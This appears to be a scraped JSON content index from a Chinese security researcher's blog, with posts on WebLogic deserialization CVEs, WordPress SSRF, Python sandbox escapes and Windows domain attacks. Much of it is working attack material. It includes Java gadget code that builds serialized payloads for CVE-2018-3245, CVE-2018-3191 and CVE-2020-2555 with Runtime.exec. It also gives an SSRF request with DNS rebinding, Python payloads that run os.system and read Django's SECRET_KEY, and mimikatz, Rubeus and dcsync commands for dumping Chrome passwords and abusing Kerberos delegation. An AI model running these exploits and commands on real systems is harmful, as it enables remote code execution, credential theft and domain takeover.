、sun.rmi.server.）随便找了一下，符合条件的挺多的：javax.management.remote.rmi.RMIConnectionImpl_Stubcom.sun.jndi.rmi.registry.ReferenceWrapper_Stubjavax.management.remote.rmi.RMIServerImpl_Stubsun.rmi.registry.RegistryImpl_Stubsun.rmi.transport.DGCImpl_Stub 1234567891011121314151617181920212223242526import com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import java.io.*;import java.rmi.server.ObjID;import java.util.Random;public class CVE_2018_3245 { public static void main(String[] args) throws IOException { ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(\"192.168.1.3\", 8080); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); ReferenceWrapper_Stub wrapperStub = new ReferenceWrapper_Stub(ref); ser(wrapperStub, \"CVE_2018_3245.ser\"); } public static void ser(Object obj, String serName) throws IOException { File file = new File(serName); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(obj); System.out.println(\"-------序列化成功\" + serName); }} CVE-2018-3245的修复补丁：2018年8月 p28343311_1036_201808Generic修复方法是添加更底层的java.rmi.server.RemoteObject。 CVE-2018-3191这个洞是jndi注入。触发点在JtaTransactionManager。 12345678910111213141516171819202122import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class CVE_2018_3191 { public static void main(String[] args) throws IOException { String jndiAddress = \"rmi://192.168.1.3:1099/Exploit\"; JtaTransactionManager jtaTransactionManager = new JtaTransactionManager(); jtaTransactionManager.setUserTransactionName(jndiAddress); ser(jtaTransactionManager, \"CVE_2018_3191.ser\"); } public static void ser(Object obj, String serName) throws IOException { File file = new File(serName); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(obj); System.out.println(\"-------序列化成功\" + serName); }} CVE-2018-3191的修复补丁：2018年8月 p28343311_1036_Generic CVE-2020-2555Oracle Coherence组件存在漏洞，该组件默认集成在Weblogic12c及以上版本中（网上资料这么说的：web10.3.6也有只是默认没有启用，未验证）。这个漏洞和cc5的构造有异曲同工之妙，触发点在BadAttributeValueExpException#readObject 中调用toString方法。在Coherence组件中LimitFilter这个类刚好可以被序列化并且有toString这个方法。因为是反序列化，this.m_comparator和this.m_oAnchorBottom都可控。也就说extractor.extract(``this``.m_oAnchorBottom)完全可控(更严格的说m_comparator需要是ValueExtractor的实例并且和m_oAnchorBottom都需要可被序列化)。我们来看一下有哪些满足条件的类实现了extract。可以注意到com.tangosol.util.extractor.ReflectionExtractor#extract它可以被序列化并且extract里面是一组反射操作。 其次注意到com.tangosol.util.extractor.ChainedExtractor#extract里面是对extrator进行链式操作（并且这个类同样可以被反序列化），说到这里已经可以看出来是和cc链一个套路了。 这里我是在windows上复现的（很奇怪我在linux完整安装打不了，windows上默认安装就可以，后来发现linux环境是7u21这个版本的BadAttributeValueExpException并没有readObject方法，另外不需要用完整示例安装默认安装即可）。 12345678910111213141516171819202122232425262728293031323334353637383940414243import com.tangosol.util.ValueExtractor;import com.tangosol.util.extractor.ChainedExtractor;import com.tangosol.util.extractor.ReflectionExtractor;import com.tangosol.util.filter.LimitFilter;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;public class CVE_2020_2555 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { //String cmd = \"touch /tmp/CVE_2020_2555_12013\"; String cmd =\"calc.exe\"; ValueExtractor[] valueExtractors = new ValueExtractor[]{ new ReflectionExtractor(\"getMethod\", new Object[]{\"getRuntime\", new Class[0]}), new ReflectionExtractor(\"invoke\", new Object[]{null, new Object[0]}), //new ReflectionExtractor(\"exec\", new Object[]{new String[]{\"/bin/bash\", \"-c\", cmd}}) new ReflectionExtractor(\"exec\", new Object[]{new String[]{\"cmd.exe\", \"/c\", cmd}}) }; // chain LimitFilter limitFilter = new LimitFilter(); limitFilter.setTopAnchor(Runtime.class); BadAttributeValueExpException expException = new BadAttributeValueExpException(null); Field m_comparator = limitFilter.getClass().getDeclaredField(\"m_comparator\"); m_comparator.setAccessible(true); m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors)); Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(\"m_oAnchorTop\"); m_oAnchorTop.setAccessible(true); m_oAnchorTop.set(limitFilter, Runtime.class); Field val = expException.getClass().getDeclaredField(\"val\"); val.setAccessible(true); val.set(expException, limitFilter); ser(expException, \"./CVE_2020_2555_12013.ser\"); } public static void ser(Object obj, String serName) throws IOException { File file = new File(serName); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(obj); System.out.println(\"-------序列化成功\" + serName); } } CVE-2020-2555的修复图片来自ZDL（侵删）可以看到是删了extractor.extract 总结梳理完一遍之后，我们得以看到整个绕过思路的全貌。笔者主观分为三个阶段。 第一阶段，CVE-2016-0638和CVE-2016-3510。利用反序列化流程中新new的原生ois绕过，只要找到了read*系列的点可以比较容易的看出来。 第二阶段，cve-2017-3248到cve-2018-3191。利用jrmp、jndi带外rce，漏洞点没有在read*的代码上下文中需要多跟几步有点“pop”的感觉了。 第三阶段，cve-2020-2555，需要对java的反序列化出现过知识点很熟悉（java原生类的触发点+weblogic组件中类似cc的套路），据说这个漏洞的作者也挖了很久。 碍于笔者水平，行文出错在所难免，如有阅读此文的师傅发现错误还请不吝指正。 参考从WebLogic看反序列化漏洞的利用与防御Java 序列化之 ExternalizableWeblogic漏洞调试笔记如何控制开放HTTPS服务的weblogic服务器Weblogic CVE-2016-0638 StreamMessageImpl反序列化绕过分析Patch S8C2 is mutually exclusive and cannot coexist with patch(es): ZLNA,EJUWWeblogic JRMP反序列化漏洞回顾CVE-2018-2893：Oracle WebLogic Server 远程代码执行漏洞分析预警漫谈 Weblogic CVE-2020-2555Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）","link":"/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/"},{"title":"wordpress xmlrpc.php have ssrf vuln(use dns rebinding bypass limit)","text":"The first is in wp-includes/class-wp-xmlrpc-server.php:6774towp-includes/http.php:551. When the incoming url is a domain name, dns parsing will be performed and determine whether ip belongs to the intranet ip. The second is wp-includes/class-http.php:265. The code in wp_http_validate_url is the same as the one in the first screenshot. The last is in wp-includes/Requests/Transport/cURL.php:162 So if I provide a domain name which has very short ttl, let the first and second time be resolved to an external network address. Let the third time be resolved into an intranet address。 The details of the payload are as follows 123456789101112131415161718POST /wordpress/xmlrpc.php HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 338&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://ffffffff.2FF02E9A.rbndr.us:443/xmlrpc.php?hack=ssrf&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://127.0.0.1:8888/wordpress/2019/10/27/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt; ffffffff is the hexadecimal form of the intranet ip 127.0.0.1 and 2FF02E9A is the hexadecimal form of the external network ip。 When dns parsing ffffffff.2FF02E9A.rbndr.us, the server will randomly return 127.0.0.1 or the external network ip Here I have been replaying this package for the convenience of testing. I hope that the dns parsing result of the request is just the external network address, the external network address, and the internal network address.(Need good luck， i I tried thousands of times)However, in the actual situation, it is entirely possible to build a dns server to accurately return the sequence of the external network address, the external network address, and the internal network address（I am too lazy =.=）. nc -lp 443","link":"/2019/11/01/wordpress%20xmlrpc.php%20have%20ssrf%20vuln(use%20dns%20rebinding%20bypass%20limit)/"},{"title":"使用mimikatz导出chrome密码","text":"模拟场景在获取某PC本地administrator的权限情况下，导出使用该PC机域普通账号的密码。 受害机ip：192.168.3.4 受害机账户： 本地管理员：administrator/toor 域普通账户：beta\\fengjie/qqq123!@# 加密机制简介chrome储存的明文密码时使用windows提供的DPAPI进行对称加密来保证安全性。加解密的密钥称为master key。master key被用户登录密码、SID和16字节随机数加密后保存在Master Key file（%APPDATA%\\Microsoft\\Protect\\%SID%）中。 最简单的情况：A用户拖A自己的密码12dpapi::chrome /in:'C:\\Users\\fengjie\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Login Data' /unprotect 在A用户登陆状态B解密A的chrome密码在用户登陆状态下可以直接用procdump或者mimikatz直接从内存中获取master key。 1234privilege::debugsekurlsa::dpapipython wmiexec.py administrator:toor@192.168.3.4 'c:\\users\\public\\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; exit' 获取到masterkey 1230bf0be64d4dc768a543b3a12d7c5210d184c07a3861cad8f2bd8b7bbacc60fd0e06e955b6dad057d070d1ce3b2bb331fd8dbce6efad08808f1849e4f4ef26d801b81b1c9cb66a3f93b58f85948e8ce53779c6e5d 接下来用mimikatz一把梭就可以了 1python wmiexec.py administrator:toor@192.168.3.4 'cd c:\\users\\public &amp;&amp; Minimimini64.exe &quot;dpapi::chrome /in:\\&quot;C:\\Users\\fengjie\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\\&quot; /masterkey:1b81b1c9cb66a3f93b58f85948e8ce53779c6e5d&quot; exit ' 最开始用wmiexec并未解密成功 后来发现是wmiexec的锅换成psexec就好了（用smbexec也可以，怀疑是因为用wmiexec时令牌完整性受限的原因，知道的师傅请教我一手） 在A用户离线状态B解密A的chrome密码现在用mimikatz重新抓已经抓不到fengjie的master key了 用户明文密码已知这种情况下有两种方法可以选择。 1.如果我们知道fengjie的明文密码，可以用runas降权(或者进行一些spwan的操作降权)，降权之后又回到了最简单的情况。（因为runas需要交互式shell，所以这种方法比较鸡肋） 123runas /user:fengjie@beta.com &quot;cmd.exe&quot;mimikatz dpapi::chrome /in:”%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies” /unprotect 2.在没有交互式的情况下可以直接用mimikatz直接算出master key。 1dpapi::masterkey /in:&quot;c:\\Users\\fengjie\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2274946182-2013957047-1890316882-1632\\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8&quot; /password:qqq123!@# 拿到master key后情况又相当于又转换回了用户在线的情景。 用户明文密码未知，知道NTLM hash1dpapi::masterkey /in:&quot;c:\\Users\\fengjie\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2274946182-2013957047-1890316882-1632\\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8&quot; /hash:632f6adad4510099d676724bfb87c6ee 总结简单的说就是三种情况 A用户获取自己chrome密码不需要知道master key A获取B用户，如果B用户在线，那么可以直接从内存中抓取出B的maste key A获取B用户，B不在线，就需要用b用户的明文密码或者NTLM hash计算出master key,在回到上面一步。 参考 渗透技巧——导出Chrome浏览器中保存的密码渗透技巧——离线导出Chrome浏览器中保存的密码渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码Operational Guidance for Offensive User DPAPI Abuse[翻译]滥用User DPAPI进行攻击的操作指南","link":"/2019/12/09/%E4%BD%BF%E7%94%A8mimikatz%E5%AF%BC%E5%87%BAchrome%E5%AF%86%E7%A0%81/"},{"title":"博客重启小记","text":"大约是在一七年那个寒假开始写技术博客，中间断断续续的更新到一八年六月。重新写博客是起于今年九月份的临时起意，一方面是想督促自己“有意识”的进步，另外一方面是假装做做技术输出。最开始博客用的是hexo，重启之后另起炉灶用是wordpress，因为并不想付云服务器月租所以决定换回hexo。在弃更到重启这段期间因为换过新笔记本并且再加上没有备份，所以之前的博客文章的md版已经灾难性的消失。大约花了一天多的时间慢慢把网页手工恢复成符合hexo格式的md（大概部分文章仍然会有格式上的错误），在整理的时候发现自己以前的文章表意不清，部分地方是片面甚至错误的（以后抽时间慢慢改，咕咕咕？）。以上～","link":"/2019/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0/"},{"title":"博客重启小记（2）","text":"有两年多年没有写博客了，最近一次写的话题还是weblogic RCE挖掘 《记一次失败的Weblogic IIOP Gadget挖掘》。虽然当时写的时候标题是“失败的”，但其实后面确实启发了另一位师傅拿到了RCE （CVE-2022-21420）。我要感谢这位师傅，不但因为它挽救了这次失败的利用，还因为它总是在过年的时候给我发红包，手动狗头。 安全研究是一门艺术，是守正出奇，是推陈出新，是对创造力的磨练。有一起研究技术的小伙伴是幸福的，感谢大学四年能遇到Syclover小组。 毕业后去了上海，又辗转香港，如今上坡两年了，准备第二次重启我的博客。未来准备更新一些学习binary和distributed system的学习笔记。 之前redteam.today域名已经被别人买走，以后打算长期用cl0und.github.io了。看到博客友链中能正常访问的已经所剩无几，这更让我到体会长期写博客的不易。希望这次我能坚持得更久一些😆 顺颂夏安。","link":"/2024/08/11/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0%EF%BC%882%EF%BC%89/"},{"title":"用python继承链搞事情","text":"前言继承链这个这个词是我自己发明的。看到有的师傅博客中将它称为egg或者ssti，但是我喜欢叫它继承链因为感觉很生动。最早遇到这种姿势是在学习python bypass沙盒的时候。当时不是很理解形如().__class__.__bases__[0].__subclasses__()的意思。学习一段时间后，我决定来总结一下构造继承链的方法，并且用此方法在django有格式化字符串漏洞的情况下读取配置文件（灵感来自p师傅博客）。 基础知识bases返回一个类直接所继承的类（元组形式） 12345678910111213141516class Base1: def __init__(self): passclass Base2: def __init__(self): passclass test(Base1, Base2): passclass test2(test): passprint test.__bases__print test2.__bases__\"\"\"(&lt;class __main__.Base1 at 0x0322ADF8&gt;, &lt;class __main__.Base2 at 0x0322AE30&gt;)(&lt;class __main__.test at 0x0322AE68&gt;,)\"\"\" 在看别人文章时发现mro和bases用法相同，两者具体区别， 暂时留个坑。 一些情况下也可用__base__直接返回单个的类 class12345678class Base: def __init__(self): passobj = Base()print obj.__class__\"\"\"__main__.Base\"\"\" 返回一个实例所属的类 globals123456789101112#coding:utf-8import osvar = 2333def fun(): passclass test: def __init__(self): passprint test.__init__.__globals__\"\"\"{'__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__file__': 'backup.py', '__package__': None, 'fun': &lt;function fun at 0x7f542e44b5f0&gt;, 'test': &lt;class __main__.test at 0x7f542e43b598&gt;, 'var': 2333, '__name__': '__main__', 'os': &lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;, '__doc__': None}\"\"\" 使用方式是 函数名.__globals__，返回一个当前空间下能使用的模块，方法和变量的字典。 Untitled subclasses()获取一个类的子类，返回的是一个列表 123456789class Base1(object): def __init__(self): passclass test(Base1): passprint Base1.__subclasses__()\"\"\"[&lt;class '__main__.test'&gt;]\"\"\" builtin &amp;&amp; builtinspython中可以直接运行一些函数，例如int(),list()等等。这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)。在控制台中直接输入__builtins__会看到如下情况 123#python2&gt;&gt;&gt; __builtins__&lt;module '__builtin__' (built-in)&gt; ps：在py3中__builtin__被换成了builtin __builtin__ 和 __builtins__之间是什么关系呢？ 1、在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。 2、非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身 继承链bypass沙盒用file对象读取文件构造继承链的一种思路是： 随便找一个内置类对象用__class__拿到他所对应的类 用__bases__拿到基类（&lt;class 'object'&gt;） 用__subclasses__()拿到子类列表 在子类列表中直接寻找可以利用的类 一言敝之 12().__class__.__base__.__subclasses__()().__class__.__bases__[0].__subclasses__() 可以看到列表里面有一坨，这里只看file对象。 1[...,&lt;type 'file'&gt;, ...] 查找file位置。 1234567#coding:utf-8search = 'file'num = 0for i in ().__class__.__bases__[0].__subclasses__(): if 'file' in str(i): print num num += 1 &lt;type 'file'&gt;在第40位。().__class__.__bases__[0].__subclasses__()[40] 用dir来看看内置的方法 1dir(().__class__.__bases__[0].__subclasses__()[40]) 1['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines'] 所以最终的payload是 1().__class__.__bases__[0].__subclasses__()[40]('filename').readlines() 然后用同样的手法可以得到__mro__形式下的payload 1().__class__.__mro__[1].__subclasses__()[40]('filename').readlines() 这种方法等价于 1file('backup.py').readlines() 但是python3已经移除了file。所以第一种方法只能在py2中用。 用内置模块执行命令第二种方法接着第一种的思路接着探索。第一种止步于把内置的对象列举出来，其实可以用__globals__更深入的去看每个类可以调用的东西（包括模块，类，变量等等），万一有os这种东西就赚了。 1234567891011121314#coding:utf-8search = 'os' #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__(): num += 1 try: if search in i.__init__.__globals__.keys(): print(i, num) except: pass \"\"\"(&lt;class 'site._Printer'&gt;, 72)(&lt;class 'site.Quitter'&gt;, 77)\"\"\" 12().__class__.__mro__[1].__subclasses__()[77].__init__.__globals__['os'].system('whoami')().__class__.__mro__[1].__subclasses__()[72].__init__.__globals__['os'].system('whoami') 不过很可惜上述的方法也只能在py2中使用。 第三种那有没有通吃py2和py3的方法呢？答案是有的，就用上面__builtins__来搞事。 1234567891011121314#coding:utf-8search = '__builtins__'num = -1for i in ().__class__.__bases__[0].__subclasses__(): num += 1 try: if search in i.__init__.__globals__.keys(): print(i, num) except: pass\"\"\"&lt;class '_frozen_importlib._ModuleLock'&gt; 64#省略一堆\"\"\" 于是乎 py3 1().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').system('whoami')&quot;) py2 1().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').system('whoami')&quot;) 继承链读django配置信息p师傅的利用格式化字符串漏洞泄露Django配置信息一文中给了两个payload都是无登陆情况下读到django配置信息，我们可以用上面所述方法找到更多的payload。 测试代码如下 1234from django.http import HttpResponsedef search(request): template = 'Hello {user}, This is your search: ' + request.GET.get('keyword') return HttpResponse(template.format(user=request.user)) 因为是无登陆情况，所以requests.User里面的对象是AnonymousUser的实例 1234class AnonymousUser(object): #省略 _groups = EmptyManager(Group) _user_permissions = EmptyManager(Permission) 观察到_groups属性是一个EmptyManager对象。 跟踪EmptyManager来到manger.py 123456789##省略from django.db.models.query import QuerySet##省略class EmptyManager(Manager): def __init__(self, model): super(EmptyManager, self).__init__() self.model = model def get_queryset(self): return super(EmptyManager, self).get_queryset().none( 跟踪QuerySet来到query.py 12345678##省略from django.conf import settings##省略class QuerySet(object): \"\"\" Represents a lazy database lookup for a set of objects. \"\"\" def __init__(self, model=None, query=None, using=None, hints=None): settings里面就是django的配置了。 将上面的跟踪一步一步转换成payload就是 拿到EmptyManager对象：user._groups.__class__ 拿到QuerySet对象：user._groups.__class__.__base__.__init__.__globals__[QuerySet] 拿到SECRET_KEY {user._groups.__class__.__base__.__init__.__globals__[QuerySet].__init__.__globals__[settings].SECRET_KEY} 所以最后的payload是 1http://127.0.0.1:8000/search?keyword={user._groups.__class__.__base__.__init__.__globals__[QuerySet].__init__.__globals__[settings].SECRET_KEY} ps:有登陆的情况下构造过程中继承链的感觉更强烈，有兴趣的师傅可以试一下~ 参考http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/ https://www.anquanke.com/post/id/85571 http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html","link":"/2018/04/24/%E7%94%A8python%E7%BB%A7%E6%89%BF%E9%93%BE%E6%90%9E%E4%BA%8B%E6%83%85/"},{"title":"用域委派打烂kerberos狗头","text":"简单回顾Kerberos认证过程假设client想访问server client 向KDC-AS 发起预认证即NTLMhash加密的时间戳 KDC-AS 验证身份后，发送client NTLMhash加密的短会话密钥seesionkey-a和krbtgt账户密码加密的TGT(TGT中也包含了sessionkey-a) client 用自己的NTLMhash解密拿到sessionkey-a，用sessionkey-a加密时间戳并发送加密的TGT给KDC-TGS KDC-TGS用krbtgt账户密码解密获取到sessionkey-a，并解密client发送的时间戳以此验明client身份。之后返回sessionkey-a加密的sessionkey-b和server的密码加密TGS（有的文章也称ST） client用sessionkey-a 解密拿到sessionkey-b，并用sessionkey-b加密时间戳一并和TGS发送给server server用自己的密码解密TGS拿到sessionkey-b解密时间戳以此验明client身份。返回sessionkey-b加密的时间戳给client，以此向client表明自己的身份（这里体现出Kerberos的双向验证）。 委派的场景n1nty师傅的原话：用户 A 利用 Windows 身份验证访问了一个网站，请求网站内的一个文件，但是这个网站服务器本身并没有这个文件，它需要利用用户 A 的身份去访问另一台服务器，从另一台服务器上获取这个文件后再返回给用户。为什么网站会利用用户 A 的身份去获取文件，而不是直接利用网站自身的权限去获取呢？因为要充分利用 Windows 系统自身提供的权限控制啊，也许有的用户有权限访问那个文件而有的用户没有权限啊。 kerberos委派分类 Forwardable TGT：Unconstrained delegation Proxy ticket：user 在访问 service1 的时候，提前把访问 service2 的票也申请好，并把这张票传递给 service1，然后 service1 就可以利用 user 的身份来访问 service2 Constrained delegation：传统的约束委派 Resource based delegation：基于资源的约束委派 非约束委派（Unconstrained delegation）假如server1主机账户配置了非约束委派，那么域账户A在对server1主机账户旗下服务service1（例如cifs服务）产生kerberos认证的时候（例如dir \\\\server1\\c$）域账户会发送包含tgt的tgs给service1，然后service1就可以代表域账户A认证域内任何服务器。示意图如下 其攻击面是如果黑客控制了server1并在上面抓取了tgt就可以借此横向移动。 约束委派约束委派里面有两种重要的协议一种叫S4U2Proxy，一种叫S4U2Self。假如在给server1主机账户配置了委派到的server2 service2服务。那么当域用户A与server1旗下的service1发生kerberos认证的时候，service1可以拿域用户A给的tgs1从域控换到可以访问server2 service2的tgs2。在用tgs1换tgs2的过程中使用的协议就是S4U2Proxy。可是有可能用户A以其他方式(如NTLM认证，基于表单的认证等方式)与server service1 认证后用户没法提供tgs，那么service1就先需要使用S4U2Self从域控那里先换到用户对自己服务的tgs1，再使用S4U2Proxy换可以访问server2 service2的tgs2。 S4U2Proxy的示意图如下 S4U2Self的示意图如下 其攻击面是如果黑客控制了server1那么他可以伪造域内任意用户访问server2的service2 传统的约束委派传统的约束委派是“正向的”，通过修改服务A属性msDS-AllowedToDelegateTo，添加服务B的SPN（Service Principle Name），设置约束委派对象（服务B），服务A便可以模拟用户向域控制器请求访问服务B以获得服务票据（TGS）来使用服务B的资源。 基于资源的约束委派2012 及以后的KDC，受限委派的机制变成了基于资源的约束委派。基于资源的约束委派则是相反的，通过修改服务B属性msDS-AllowedToActOnBehalfOfOtherIdentity，添加服务A的SPN，达到让服务A模拟用户访问B资源的目的。 两者联系与区别示意图如下 发现域内配置委派的账户在域内的可以委派的账户有两种一种是主机账户（NetComputer）另一种是用setspn手动添加的服务账户（NetUser），上文中不管是非约束还是约束的例子是以主机账户举例，因为用主机账户来委派的环境好搭并且便于理解，不过服务账户和主机账户从攻击委派这个视角来看是等价的。 检查非约束委派可以使用master版的PowerViewhttps://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 12Get-NetUser -Unconstrained -Domain beta.comGet-NetComputer -Unconstrained -Domain beta.com 检查约束委派可以使用开发版的PowerViewhttps://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 12Get-DomainUser -TrustedToAuth -Domain beta.comGet-DomainComputer -TrustedToAuth -Domain beta.com 环境说明WIN-PMID8H9A6H0 192.168.3.2（域控， server2012）exchange 192.168.3.3 (server2012)database 192.168.3.4 (win10)database2 192.168.3.5 (win7) 攻击非约束委派在WIN-PMID8H9A6H0上用域管登陆（这是一句废话，默认情况只有域管可以登陆域控），在Active Directory用户和计算机中，将computer组里面的database2选为信任此计算机来委派任何服务即非约束委派。然后在cmd中dir \\\\database2\\c$。 在database2上用本地管理员登陆并用mimikatz抓取tickets 1mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit 可以看到域管理员传来的tgt 用mimikatz将域管理员的tgt导入 1mimikatz.exe &quot;kerberos::ptt [0;a4e7f]-2-0-60a10000-Administrator@krbtgt-BETA.COM.kirbi&quot; exit 本地管理员成功访问域控 攻击非约束委派（进阶）上面利用非约束委派拿到域管账户TGT的前提是需要域管账户和委派主机有过交互才能获取到TGT。当域控机器开启Print Spooler服务时(默认开启且以System权限运行)，攻击者可以主动要求域控访问已被攻击者控制的非受限委派服务器，进而获取域控主机账户的TGT。当然这种攻击方式也适用于其他非域控机器。但是这种攻击有一个限制是需要找到一台开启非受限委派的主机账户，而非服务账户并且有一个域普通账户 完成这一套攻击需要两个Rubeus和SpoolSample的工具，Rubeus可以看作对kekeo的弥补，SpoolSample用户向DC2 Print Spooler发起请求。SpoolSample貌似只能用.net4.0以上的版本编译，所以这次就在win10上用了。本地管理员运行 1Rubeus.exe monitor /interval:5 /filteruser:WIN-PMID8H9A6H0$ 域普通账户运行 1SpoolSample.exe WIN-PMID8H9A6H0 database2 困惑的是这里报错了，查了报错码说是Print Spooler没开，但是明明开了的。。。不过峰回路转的是database2 上可以抓到域控传来的tgt 12kerberos::ptt [0;a8543]-2-0-60a10000-WIN-PMID8H9A6H0$@krbtgt-BETA.COM.kirbilsadump::dcsync /domain:beta.com /all /csv 攻击约束委派域控上这么配置 在database2上用mimikatz抓取主机账户htlm hash（主机账户即hostname$） 12privilege::debugsekurlsa::logonpasswords full 用拿到的ntlm hash申请tgt 1tgt::ask /user:database2$ /domain:beta.com /ntlm:65118c9246cada2aa3e1a366f3ed06cf ps：其实抓hash和kekeo的操作在拥有database2主机权限下都是多余的操作。这里为了完整性写出来，其实际意义在于在实战中通过其他方式例如爆破获取了服务账号的密码（服务账号的密码是管理员自己设置所以可能是弱口令，至于主机账户的密码上上张图你也看到了长的过分）的情况下进行约束委派攻击。 获取访问exchange cifs服务的tgs（tgs是域管权限） 1tgs::s4u /tgt:TGT_database2$@BETA.COM_krbtgt~beta.com@BETA.COM.kirbi /user:Administrator@beta.com /service:cifs/exchange.beta.com 将tgs导入 1kerberos::ptt TGS_Administrator@beta.com@BETA.COM_cifs~exchange.beta.com@BETA.COM.kirbi 以本地管理员身份假装域管访问exchange smb 杂 默认情况下普通域用户只能登陆域中的PC不能登陆域中server tgt使用与域账号无关，本地账户仍然可以使用tgt tgt是从本质来说是krbtgt服务的tgs 参考域渗透-Delegation利用资源约束委派进行的提权攻击分析利用 Kerberos delegation 打造变种黄金票据Setting up delegation between servers for Windows authenticated sitesAttacking Kerberos DelegationN1CTF 2019 Pentest N1ctf2019.lab WPKerberos和NTLM – SQL Server连接的那点事SQL Server 只安装客户端的方法","link":"/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/"},{"title":"记一次失败的Weblogic IIOP Gadget挖掘","text":"前记当时以为挖成功了，结果后来发现是少打了一个补丁，在朋友圈虚晃了一枪。不过整个利用思路还算有趣，这并不妨碍在这里分享一下。 sink点可行性验证开局风干师傅送了个sink点。 我们先来分析一下sink点com.tangosol.coherence.transaction.internal.storage.KeyBackingMap#put的可行性。 如果这里this.m_context是ReplicatedCache$BackingMapContext，反序列化的时候会进入BackingMapContext#getValueFromInternalConverter再进入getConverterFromInternal。 因为this.__m_ConverterFromInternal为transient在反序列的时候为空，根据代码逻辑反序列化的时候会创一个新的converter，并调用convert方法转换受控的oVal的对象。 我们继续跟进，看一下converter是什么样子的, converter类型固定ReplicatedCache$ConverterFromInternal。 ReplicatedCache$ConverterFromInternal的convert。 是不是很眼熟？没错，是我去年挖weblogic的时候找到的sink点, 二阶反序列化类型。 补全gadget那么现在需要从source点找一条通路，放入常见的source点自动化跑，无奈工具太菜，大海捞针。捞到一个，应该还有其他的，我没一个一个看了。 接下来再用BadAttributeValueExpException前半段就完全走通了。 构造exp与javaassit的妙用路径找到了接着，就是填充一些必要的条件，构造payload了。 构造的时候会发现对com.tangosol.coherence.component.util.daemon.queueProcessor.Service有依赖。这个类是实现了Serializable接口的，但是官方的本意是不想让它被序列化的， 不过在反序列化的时候，并没有做对应的检查。所以我们用javaassit强行把这个方法改成$1.defaultWriteObject(); 类似的，javaassit的妙用还可以减轻构造payload时候的痛苦，我们可以审计一部分代码，用javaassit把没用的逻辑阉割掉。 例如KeyBackingMap构造方法中 context.getCacheService().getInfo().getServiceName(), 一波连环夺命call要正常运行需要各种补全条件，一波操作就为了拿一个没什么卵用的字符串。 